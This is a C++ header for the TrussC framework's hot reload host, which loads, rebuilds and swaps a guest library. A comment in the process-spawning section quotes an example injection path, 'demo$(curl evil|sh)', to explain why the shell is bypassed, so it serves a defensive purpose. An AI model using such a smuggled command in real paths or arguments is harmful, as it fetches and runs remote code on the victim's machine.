#pragma once

// =============================================================================
// tcHotReloadHost.h — Hot reload host runtime
// =============================================================================
// This header is included only by the Host executable (when TC_HOT_RELOAD_BUILD
// is defined). It implements:
//   - Guest shared library loading via dlopen/dlsym
//   - Polling-based file watcher on src/
//   - Automatic Guest rebuild via cmake
//   - Live swap of the App instance without restarting the event loop
// =============================================================================

#ifdef TC_HOT_RELOAD_BUILD

// Note: this header is included BY TrussC.h (after all core types are defined).
#ifdef _WIN32
#include <windows.h>
#include <process.h>
#else
#include <dlfcn.h>
#include <spawn.h>
#include <sys/wait.h>
#include <cstring>
extern char** environ;
#endif
#include <filesystem>
#include <fstream>
#include <chrono>
#include <string>
#include <vector>
#include <iostream>
#include <cstdlib>

namespace trussc {
namespace hot_reload {

namespace fs = std::filesystem;
using std::string;
using std::vector;
using std::ifstream;
using std::cout;
using std::cerr;
using Clock = std::chrono::steady_clock;

// Function pointer types for Guest exports
using CreateAppFn  = App* (*)();
using DestroyAppFn = void (*)(App*);

// ---------------------------------------------------------------------------
// Guest library manager
// ---------------------------------------------------------------------------

struct GuestLibrary {
#ifdef _WIN32
    HMODULE handle = nullptr;
#else
    void* handle = nullptr;
#endif
    CreateAppFn createApp = nullptr;
    DestroyAppFn destroyApp = nullptr;
    std::shared_ptr<App> app;
    string loadedPath;  // actual path loaded (may be a temp copy on Windows)

    bool load(const string& path) {
        // Always load from a unique temp path. Without this, the OS dynamic
        // loader deduplicates by pathname/inode and may return the already-
        // loaded handle on subsequent dlopen() calls:
        //   - Windows:  can't overwrite a loaded DLL at all.
        //   - Linux:    glibc caches loaded objects; if C++ statics/typeinfo
        //               keep the refcount above 0, dlclose() doesn't actually
        //               unload, so a later dlopen(samepath) silently hands
        //               back the OLD code.
        //   - macOS:    dyld usually picks up the replacement, but copying to
        //               a unique path makes behavior identical across OSes.
        static int loadCounter = 0;
#ifdef _WIN32
        const char* ext = ".tmp.dll";
#else
        const char* ext = ".tmp.so";
#endif
        string tempPath = path + "." + std::to_string(loadCounter++) + ext;
        try { fs::copy_file(path, tempPath, fs::copy_options::overwrite_existing); }
        catch (...) { cerr << "[HotReload] Failed to copy library to " << tempPath << "\n"; return false; }

#ifdef _WIN32
        handle = LoadLibraryA(tempPath.c_str());
        if (!handle) {
            cerr << "[HotReload] LoadLibrary failed (error " << GetLastError() << ")\n";
            try { fs::remove(tempPath); } catch (...) {}
            return false;
        }
        createApp = (CreateAppFn)GetProcAddress(handle, "tcHotReloadCreateApp");
        destroyApp = (DestroyAppFn)GetProcAddress(handle, "tcHotReloadDestroyApp");
        if (!createApp || !destroyApp) {
            cerr << "[HotReload] GetProcAddress failed\n";
            FreeLibrary(handle);
            handle = nullptr;
            try { fs::remove(tempPath); } catch (...) {}
            return false;
        }
#else
        handle = dlopen(tempPath.c_str(), RTLD_NOW | RTLD_LOCAL);
        if (!handle) {
            cerr << "[HotReload] dlopen failed: " << dlerror() << "\n";
            try { fs::remove(tempPath); } catch (...) {}
            return false;
        }
        createApp = (CreateAppFn)dlsym(handle, "tcHotReloadCreateApp");
        destroyApp = (DestroyAppFn)dlsym(handle, "tcHotReloadDestroyApp");
        if (!createApp || !destroyApp) {
            cerr << "[HotReload] dlsym failed: " << dlerror() << "\n";
            dlclose(handle);
            handle = nullptr;
            try { fs::remove(tempPath); } catch (...) {}
            return false;
        }
#endif
        loadedPath = tempPath;
        return true;
    }

    App* create() {
        if (createApp) {
            App* raw = createApp();
            auto deleter = destroyApp;
            app = std::shared_ptr<App>(raw, [deleter](App* p) {
                if (deleter) deleter(p);
            });
            return raw;
        }
        return nullptr;
    }

    void destroy() {
        app.reset();
    }

    void unload() {
        destroy();
        if (handle) {
#ifdef _WIN32
            FreeLibrary(handle);
#else
            dlclose(handle);
#endif
            handle = nullptr;
            // Remove the per-load temp copy. On Linux this is safe even if
            // dlclose didn't fully unload: unlink just drops the directory
            // entry — the mmap'd pages stay alive until the OS releases them.
            try { fs::remove(loadedPath); } catch (...) {}
        }
        createApp = nullptr;
        destroyApp = nullptr;
    }
};

// ---------------------------------------------------------------------------
// File watcher (polling-based, checks mtime of src/ files)
// ---------------------------------------------------------------------------

struct FileWatcher {
    vector<fs::path> watchPaths;
    fs::file_time_type lastBuildTime;

    void init(const string& srcDir) {
        watchPaths.clear();
        if (!fs::exists(srcDir)) return;
        for (const auto& entry : fs::recursive_directory_iterator(srcDir)) {
            if (entry.is_regular_file()) {
                auto ext = entry.path().extension().string();
                if (ext == ".cpp" || ext == ".h" || ext == ".hpp" || ext == ".mm") {
                    watchPaths.push_back(entry.path());
                }
            }
        }
        lastBuildTime = fs::file_time_type::clock::now();
    }

    bool hasChanges() {
        for (const auto& p : watchPaths) {
            try {
                if (fs::last_write_time(p) > lastBuildTime) return true;
            } catch (...) {}
        }
        return false;
    }

    void markBuilt() {
        lastBuildTime = fs::file_time_type::clock::now();
    }

    // Re-scan in case new files were added
    void rescan(const string& srcDir) {
        auto saved = lastBuildTime;
        init(srcDir);
        lastBuildTime = saved;
    }
};

// ---------------------------------------------------------------------------
// Find cmake binary (same logic as trusscli)
// ---------------------------------------------------------------------------

inline string findCMake(const string& buildDir = "") {
    // Prefer the cmake that originally configured this build directory.
    // On Windows, PATH may resolve to an older VS cmake that doesn't
    // know the generator used by the current build (e.g. "Visual Studio 18 2026").
    if (!buildDir.empty()) {
        fs::path cachePath = fs::path(buildDir) / "CMakeCache.txt";
        if (fs::exists(cachePath)) {
            ifstream cache(cachePath);
            string line;
            while (getline(cache, line)) {
                if (line.rfind("CMAKE_COMMAND:INTERNAL=", 0) == 0) {
                    string path = line.substr(23);
                    if (fs::exists(path)) return path;
                }
            }
        }
    }
#ifdef __APPLE__
    const char* paths[] = {
        "/opt/homebrew/bin/cmake",
        "/usr/local/bin/cmake",
        "/Applications/CMake.app/Contents/bin/cmake",
    };
    for (const char* p : paths) {
        if (fs::exists(p)) return p;
    }
#endif
    return "cmake";
}

// ---------------------------------------------------------------------------
// Spawn a process with explicit argv (no shell). Equivalent in spirit to
// trusscli's runProcess(). We bypass std::system because the build dir is
// derived from fs::canonical(getExecutablePath()) — outside the developer's
// direct control once the binary is built and distributed — and may contain
// shell metacharacters that would be expanded by /bin/sh -c "...".
// Specifically, $(cmd) and `cmd` are evaluated even inside double quotes,
// so a path like ~/projects/demo$(curl evil|sh)/ would execute the embedded
// command on every rebuild. Passing argv directly to posix_spawnp /
// _spawnvp removes the shell from the loop entirely; any metacharacters
// become literal argument bytes to cmake.
// ---------------------------------------------------------------------------
inline int runBuildCommand(const vector<string>& argv) {
    if (argv.empty()) return -1;

#ifdef _WIN32
    // Build a quoted command line for CreateProcess.
    // _spawnvp can mangle argv when the executable path contains spaces.
    string cmdLine;
    for (size_t i = 0; i < argv.size(); i++) {
        if (i > 0) cmdLine += ' ';
        bool needsQuote = argv[i].find(' ') != string::npos;
        if (needsQuote) cmdLine += '"';
        cmdLine += argv[i];
        if (needsQuote) cmdLine += '"';
    }
    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    si.hStdError  = GetStdHandle(STD_ERROR_HANDLE);
    PROCESS_INFORMATION pi = {};
    vector<char> buf(cmdLine.begin(), cmdLine.end());
    buf.push_back('\0');
    if (!CreateProcessA(argv[0].c_str(), buf.data(),
                        nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi)) {
        cerr << "[HotReload] Failed to launch: " << argv[0] << "\n";
        return -1;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode = 1;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)exitCode;
#else
    vector<char*> cargv;
    cargv.reserve(argv.size() + 1);
    for (const auto& a : argv) cargv.push_back(const_cast<char*>(a.c_str()));
    cargv.push_back(nullptr);
    pid_t pid;
    int err = posix_spawnp(&pid, cargv[0], nullptr, nullptr,
                            cargv.data(), environ);
    if (err != 0) {
        std::cerr << "[HotReload] failed to spawn '" << argv[0]
                  << "': " << std::strerror(err) << "\n";
        return -1;
    }
    int status = 0;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status))   return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
    return -1;
#endif
}

// ---------------------------------------------------------------------------
// Hot reload host — manages the Guest lifecycle
// ---------------------------------------------------------------------------

struct Host {
    GuestLibrary guest;
    FileWatcher watcher;
    string projectDir;   // project root (where CMakeLists.txt is)
    string buildDir;     // cmake build directory
    string guestLibPath; // path to the built guest library
    string srcDir;       // src/ directory to watch
    Clock::time_point lastCheck;
    int reloadCount = 0;
    bool initialized = false;

    bool init() {
        // Detect project directory from the executable's location
        // The Host EXE is at bin/<AppName>.app/Contents/MacOS/<AppName> (macOS)
        // or bin/<AppName> (Linux)
        fs::path exePath = fs::canonical(getExecutablePath());
        fs::path searchPath = exePath.parent_path();

        #ifdef __APPLE__
        // Climb out of MacOS → Contents → .app → bin → project root
        for (int i = 0; i < 4 && searchPath.has_parent_path(); ++i) {
            searchPath = searchPath.parent_path();
        }
        #else
        // bin → project root
        searchPath = searchPath.parent_path();
        #endif

        projectDir = searchPath.string();
        srcDir = projectDir + "/src";

        // Detect the build directory — try preset-style names first, fall back to build/
#ifdef __APPLE__
        const char* presetDirs[] = {"build-macos", "xcode", "build"};
#elif defined(_WIN32)
        const char* presetDirs[] = {"build-windows", "vs", "build"};
#else
        const char* presetDirs[] = {"build-linux", "build"};
#endif
        buildDir = "";
        for (const char* d : presetDirs) {
            string candidate = projectDir + "/" + d;
            if (fs::exists(candidate + "/CMakeCache.txt")) {
                buildDir = candidate;
                break;
            }
        }
        if (buildDir.empty()) {
            // No configured build dir found — use the first preset name
            buildDir = projectDir + "/" + presetDirs[0];
        }

        if (!fs::exists(srcDir)) {
            cerr << "[HotReload] src/ directory not found at " << srcDir << "\n";
            return false;
        }

        // Guest library path: search known locations for the built dylib.
        // Single-config (Ninja/Make): buildDir直下。
        // Multi-config (Xcode/VS): <config>/ サブディレクトリ。
        // Files are searched in priority order; whichever exists wins.
#ifdef __APPLE__
        const string guestName = "libguest.dylib";
#elif defined(_WIN32)
        const string guestName = "guest.dll";
#else
        const string guestName = "libguest.so";
#endif
        const char* configs[] = {"Debug", "Release", "RelWithDebInfo", "MinSizeRel"};
        guestLibPath = "";
        if (fs::exists(buildDir + "/" + guestName)) {
            guestLibPath = buildDir + "/" + guestName;
        } else {
            for (const char* c : configs) {
                string candidate = buildDir + "/" + c + "/" + guestName;
                if (fs::exists(candidate)) { guestLibPath = candidate; break; }
            }
        }
        // Nothing yet — the initial rebuildGuest() below will create it. Pick
        // a sensible default destination so the post-rebuild load() finds it.
        // If any config subdir exists, we're in a multi-config tree → Debug/.
        if (guestLibPath.empty()) {
            bool multiConfig = false;
            for (const char* c : configs) {
                if (fs::exists(buildDir + "/" + c)) { multiConfig = true; break; }
            }
            guestLibPath = multiConfig ? (buildDir + "/Debug/" + guestName)
                                       : (buildDir + "/" + guestName);
        }

        // Initial build of the Guest
        if (!rebuildGuest()) {
            cerr << "[HotReload] Initial Guest build failed\n";
            return false;
        }

        // Load the Guest and create the initial App instance
        if (!guest.load(guestLibPath)) {
            cerr << "[HotReload] Failed to load Guest library\n";
            return false;
        }
        if (!guest.create()) {
            cerr << "[HotReload] Failed to create initial App instance\n";
            return false;
        }

        // Start watching
        watcher.init(srcDir);
        lastCheck = Clock::now();
        initialized = true;

        logNotice("HotReload") << "Ready. Watching " << srcDir
                               << " (" << watcher.watchPaths.size() << " files)";
        return true;
    }

    bool rebuildGuest() {
        string cmake = findCMake(buildDir);
        logNotice("HotReload") << "Rebuilding guest...";

        // Only rebuild the guest target — fast incremental build.
        // argv is passed directly to posix_spawnp / _spawnvp — no shell
        // is involved, so $(...), ``, ; etc. in buildDir cannot run.
        // For multi-config generators (Xcode, Visual Studio), cmake picks the
        // generator's default config (Debug) when --config is omitted — which
        // matches the layout the rest of init() expects (Debug/libguest.dylib).
        int rc = runBuildCommand({cmake, "--build", buildDir,
                                  "--target", "guest", "--parallel"});
        if (rc != 0) {
            logError() << "[HotReload] Build failed (exit code " << rc << ")";
            return false;
        }
        return true;
    }

    bool reload() {
        // IMPORTANT: rebuild BEFORE unloading the old Guest. On macOS/Linux,
        // overwriting a loaded dylib is safe (the old inode stays in memory).
        // If the build fails, the old App keeps running undisturbed.

        auto tStart = Clock::now();
        if (!rebuildGuest()) {
            logWarning() << "[HotReload] Build failed — keeping current version";
            watcher.markBuilt();  // don't re-trigger on the same mtime
            return false;
        }
        auto tBuildDone = Clock::now();

        // Build succeeded — now swap: destroy old App, unload old library,
        // load the new one.
        guest.unload();

        if (!guest.load(guestLibPath)) {
            logError() << "[HotReload] Failed to load rebuilt library";
            return false;
        }

        App* newApp = guest.create();
        if (!newApp) {
            logError() << "[HotReload] Failed to create App instance";
            return false;
        }

        // Seed the new App's size from the current window. The normal launch
        // path does this once after appSetupFunc (see runApp / runHotReloadApp
        // bootstrapping in TrussC.h), but sokol won't fire a windowResized
        // event during reload because the actual window dimensions haven't
        // changed — without this, App::setup() runs while getWidth()==0 and
        // every child gets squished into a zero-sized rect.
        {
            int w = sapp_width();
            int h = sapp_height();
            float dpiScale = sapp_dpi_scale();
            float scale = internal::pixelPerfectMode ? 1.0f : (1.0f / dpiScale);
            newApp->handleWindowResized(static_cast<int>(w * scale),
                                        static_cast<int>(h * scale));
        }

        reloadCount++;
        watcher.markBuilt();
        watcher.rescan(srcDir);

        // Report build vs swap split — useful for diagnosing where time goes
        // (e.g. when iterating on PCH or linker flags).
        using ms = std::chrono::milliseconds;
        auto tEnd = Clock::now();
        long buildMs = std::chrono::duration_cast<ms>(tBuildDone - tStart).count();
        long swapMs  = std::chrono::duration_cast<ms>(tEnd - tBuildDone).count();
        long totalMs = std::chrono::duration_cast<ms>(tEnd - tStart).count();
        logNotice("HotReload") << "Reloaded (#" << reloadCount << ") — "
                               << totalMs << " ms total (build " << buildMs
                               << " ms + swap " << swapMs << " ms)";
        return true;
    }

    // Called from the update loop — checks for file changes periodically
    void poll() {
        if (!initialized) return;

        auto now = Clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - lastCheck);
        if (elapsed.count() < 500) return;  // Check every 500ms
        lastCheck = now;

        if (watcher.hasChanges()) {
            reload();
        }
    }

    App* getApp() { return guest.app.get(); }
};

// ---------------------------------------------------------------------------
// Global host instance
// ---------------------------------------------------------------------------
inline Host g_host;

} // namespace hot_reload

// ---------------------------------------------------------------------------
// runHotReloadApp — entry point for hot reload mode
// ---------------------------------------------------------------------------

namespace internal {

inline int runHotReloadApp(const WindowSettings& settings) {
    using namespace hot_reload;

    // Initialize the host (builds and loads Guest for the first time)
    // This must happen AFTER sokol is initialized, but we need the App*
    // before sapp_run. So we defer Guest loading to the setup callback.

    // Set up callbacks that go through the Host's dynamically loaded App
    internal::appSetupFunc = []() {
        if (!g_host.init()) {
            logError() << "[HotReload] Host initialization failed. Exiting.";
            sapp_quit();
            return;
        }
        // The Guest's App has been created by g_host.init() → guest.create().
        // TrussC's internal setup (screen size etc.) is already done by _setup_cb.
    };

    internal::appUpdateFunc = []() {
        // Poll for file changes
        g_host.poll();

        internal::updateFrameCount++;
        events().update.notify();
        App* app = g_host.getApp();
        if (app) {
            app->handleUpdate(internal::currentWindowContext().mouseX, internal::currentWindowContext().mouseY);
        }
    };

    internal::appDrawFunc = []() {
        events().draw.notify();
        App* app = g_host.getApp();
        if (app) app->handleDraw();
    };

    internal::appCleanupFunc = []() {
        App* app = g_host.getApp();
        if (app) {
            events().exit.notify();
            app->exit();
            app->cleanup();
        }
        g_host.guest.unload();
    };

    internal::appKeyPressedFunc = [](const KeyEventArgs& e) {
        App* app = g_host.getApp();
        if (app) app->handleKeyPressed(e);
    };
    internal::appKeyReleasedFunc = [](const KeyEventArgs& e) {
        App* app = g_host.getApp();
        if (app) app->handleKeyReleased(e);
    };
    internal::appMousePressedFunc = [](const MouseEventArgs& e) {
        App* app = g_host.getApp();
        if (app) app->handleMousePressed(e);
    };
    internal::appMouseReleasedFunc = [](const MouseEventArgs& e) {
        App* app = g_host.getApp();
        if (app) app->handleMouseReleased(e);
    };
    internal::appMouseMovedFunc = [](const internal::MouseEventRaw& e) {
        App* app = g_host.getApp();
        if (app) app->handleMouseMoved(e);
    };
    internal::appMouseDraggedFunc = [](const internal::MouseEventRaw& e) {
        App* app = g_host.getApp();
        if (app) app->handleMouseDragged(e);
    };
    internal::appMouseScrolledFunc = [](const ScrollEventArgs& e) {
        App* app = g_host.getApp();
        if (app) app->handleMouseScrolled(e);
    };
    internal::appWindowResizedFunc = [](int w, int h) {
        App* app = g_host.getApp();
        if (app) app->handleWindowResized(w, h);
    };
    internal::appFilesDroppedFunc = [](const std::vector<std::string>& files) {
        App* app = g_host.getApp();
        if (app) app->filesDropped(files);
    };

    // Build the sokol descriptor (without template — we handle App* manually)
    internal::pixelPerfectMode = settings.pixelPerfect;

    sapp_desc desc = {};
    if (settings.pixelPerfect) {
        float displayScale = getDisplayScaleFactor();
        desc.width = static_cast<int>(settings.width / displayScale);
        desc.height = static_cast<int>(settings.height / displayScale);
    } else {
        desc.width = settings.width;
        desc.height = settings.height;
    }
    desc.window_title = settings.title.c_str();
    desc.high_dpi = settings.highDpi;
    desc.sample_count = settings.sampleCount;
    desc.fullscreen = settings.fullscreen;
    desc.swap_interval = settings.swapInterval;
    desc.init_cb = internal::_setup_cb;
    desc.frame_cb = internal::_frame_cb;
    desc.cleanup_cb = internal::_cleanup_cb;
    desc.event_cb = internal::_event_cb;
    desc.logger.func = slog_func;
    desc.enable_dragndrop = true;
    desc.max_dropped_files = 16;
    desc.max_dropped_file_path_length = 2048;
    desc.enable_clipboard = true;
    desc.clipboard_size = settings.clipboardSize;
    internal::currentWindowContext().clipboardSize = settings.clipboardSize;

    sapp_run(&desc);
    return 0;
}

} // namespace internal

} // namespace trussc

#endif // TC_HOT_RELOAD_BUILD
